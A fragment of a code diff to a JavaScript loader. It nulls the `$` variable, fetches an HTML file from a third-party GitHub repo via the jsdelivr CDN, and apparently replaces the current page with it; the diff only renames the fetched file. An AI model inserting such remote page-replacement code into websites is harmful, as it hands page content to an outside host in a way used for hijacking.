@@ -1,6 +1,6 @@
 var xhr = new XMLHttpRequest();
 $ = null;
-xhr.open('GET', 'https://cdn.jsdelivr.net/gh/you2048/changba/s.html', false);
+xhr.open('GET', 'https://cdn.jsdelivr.net/gh/you2048/changba/sss.html', false);
 xhr.onload = function () {
   if (xhr.status == 200) {
     var doc = document.open('replace', 'text/html');
